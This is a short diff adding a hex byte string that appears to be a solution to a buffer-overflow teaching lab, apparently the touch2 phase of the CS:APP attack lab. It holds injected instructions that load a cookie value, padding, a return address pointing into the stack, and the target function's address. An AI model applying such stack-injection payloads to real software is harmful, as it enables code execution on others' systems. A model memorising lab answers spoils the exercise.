@@ -1,0 +1,5 @@
+48 c7 c7 3f 48 59 6a c3 /* sets the cookie */
+00 00 00 00 00 00 00 00 /* this is padding */
+00 00 00 00 00 00 00 00 /* this is padding */
+d8 58 68 55 00 00 00 00 /* address of register %rsp */
+14 13 40 00 00 00 00 00 /* this is the address of touch2 */
